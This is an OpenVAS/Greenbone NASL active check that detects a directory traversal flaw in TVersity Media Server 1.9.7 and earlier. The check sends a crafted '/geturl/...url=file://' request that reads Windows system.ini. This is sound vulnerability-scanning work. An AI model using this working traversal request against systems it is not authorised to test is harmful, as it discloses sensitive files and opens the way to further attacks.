# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802619");
  script_version("2025-01-21T05:37:33+0000");
  script_tag(name:"last_modification", value:"2025-01-21 05:37:33 +0000 (Tue, 21 Jan 2025)");
  script_tag(name:"creation_date", value:"2012-03-15 12:12:12 +0530 (Thu, 15 Mar 2012)");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_name("TVersity <= 1.9.7 Directory Traversal Vulnerability - Active Check");

  script_category(ACT_ATTACK);

  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web Servers");
  script_dependencies("gb_get_http_banner.nasl");
  script_require_ports("Services/www", 41952);
  script_mandatory_keys("TVersity_Media_Server/banner");

  script_tag(name:"summary", value:"TVersity is prone to a directory traversal vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"The flaw is due to an input validation error in the TVersity
  Media Server when processing web requests can be exploited to disclose arbitrary files via
  directory traversal attacks.");

  script_tag(name:"impact", value:"Successful exploitation may allow an attacker to obtain
  sensitive information, which can lead to launching further attacks.");

  script_tag(name:"affected", value:"TVersity version 1.9.7 and prior.");

  script_tag(name:"solution", value:"No known solution was made available for at least one year
  since the disclosure of this vulnerability. Likely none will be provided anymore. General
  solution options are to upgrade to a newer release, disable respective features, remove the
  product or replace the product by another one.");

  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/18603");
  script_xref(name:"URL", value:"http://aluigi.org/adv/tversity_1-adv.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/110802/tversity_1-adv.txt");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("port_service_func.inc");

port = http_get_port(default: 41952);

banner = http_get_remote_headers(port: port);
if (!banner || "TVersity Media Server" >!< banner)
  exit(0);

foreach dir (make_list("c:", "d:", "e:", "f:")) {
  url = "/geturl/%2e?type=audio/mpeg&url=file://" + dir + "/windows/&ext=system.ini";

  if (http_vuln_check(port: port, url: url, pattern: "\[drivers\]", check_header: TRUE)) {
    report = http_report_vuln_url(port: port, url: url);
    security_message(port: port, data: report);
    exit(0);
  }
}

exit(99);
